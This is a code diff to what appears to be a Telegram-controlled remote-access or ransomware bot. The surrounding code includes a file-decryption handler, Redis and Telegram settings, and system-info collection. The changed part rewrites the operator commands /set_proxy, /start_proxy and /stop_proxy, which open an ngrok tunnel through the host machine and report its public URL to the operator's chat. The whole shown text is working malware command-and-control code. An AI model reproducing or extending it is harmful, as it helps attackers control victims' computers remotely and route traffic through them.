@@ -27,7 +27,7 @@ from libs.system_info import get_systeminfo as systinfo
 
 #REDIS CONF
 REDIS_HOST = ""
-REDIS_PORT = 0 #PORT GOES HERE
+REDIS_PORT = 00 #PORT GOES HERE
 REDIS_PASS = ""
 
 #TELEGRAM CONF
@@ -1095,42 +1095,66 @@ async def handle_decrypt_files(data, *args):
 
     await send_message(NOTIFY_CHATID, "Decryption complete.")
 
-@command_handler("/start_proxy")
-async def handle_change_wallpaper(data, *args):
-    
+# Global variable to hold the proxy manager instance
+proxy_manager = None
+
+@command_handler("/set_proxy")
+async def handle_set_proxy(data, *args):
+    """
+    Set the ngrok proxy object with a token.
+    Usage: /set_proxy <ngrok_token>
+    """
+    global proxy_manager
+
+    if len(args) < 1:
+        await send_message(NOTIFY_CHATID, "Usage: /set_proxy <ngrok_token>")
+        return
+
+    ngrok_token = args[0]
 
     try:
-        if len(args) < 1:
-            await send_message(NOTIFY_CHATID, "Usage: /start_proxy <ngrok_token>")
-            return
+        proxy_manager = NgrokProxyManager(ngrok_token)
+        await send_message(NOTIFY_CHATID, "Proxy manager initialized successfully.")
+    except Exception as e:
+        await send_message(NOTIFY_CHATID, f"Failed to initialize proxy manager: {e}")
 
-        ngrok_token = args[0]  # Replace with your ngrok auth token
-        manager = NgrokProxyManager(ngrok_token)
-        
-        ngrok_url = manager.start_all()
-        
-        await send_message(NOTIFY_CHATID, f"Proxy hosted at {ngrok_url}")
+
+@command_handler("/start_proxy")
+async def handle_start_proxy(data, *args):
+    """
+    Start the proxy using the set proxy manager.
+    Usage: /start_proxy
+    """
+    global proxy_manager
+
+    if proxy_manager is None:
+        await send_message(NOTIFY_CHATID, "Proxy manager is not set. Use /set_proxy <ngrok_token> first.")
+        return
+
+    try:
+        ngrok_url = proxy_manager.start_all()
+        await send_message(NOTIFY_CHATID, f"Proxy started. Hosted at {ngrok_url}")
     except Exception as e:
         await send_message(NOTIFY_CHATID, f"Failed to start proxy: {e}")
 
+
 @command_handler("/stop_proxy")
-async def handle_change_wallpaper(data, *args):
-    
+async def handle_stop_proxy(data, *args):
+    """
+    Stop the proxy using the set proxy manager.
+    Usage: /stop_proxy
+    """
+    global proxy_manager
+
+    if proxy_manager is None:
+        await send_message(NOTIFY_CHATID, "Proxy manager is not set. Use /set_proxy <ngrok_token> first.")
+        return
 
     try:
-        if len(args) < 1:
-            await send_message(NOTIFY_CHATID, "Usage: /stop_proxy <ngrok_token>")
-            return
-
-        ngrok_token = args[0]  # Replace with your ngrok auth token
-        manager = NgrokProxyManager(ngrok_token)
-        
-        manager.stop_all()
-        
-        await send_message(NOTIFY_CHATID, f"Proxy stopped")
+        proxy_manager.stop_all()
+        await send_message(NOTIFY_CHATID, "Proxy stopped successfully.")
     except Exception as e:
         await send_message(NOTIFY_CHATID, f"Failed to stop proxy: {e}")
-
 
 
 @command_handler("/status")
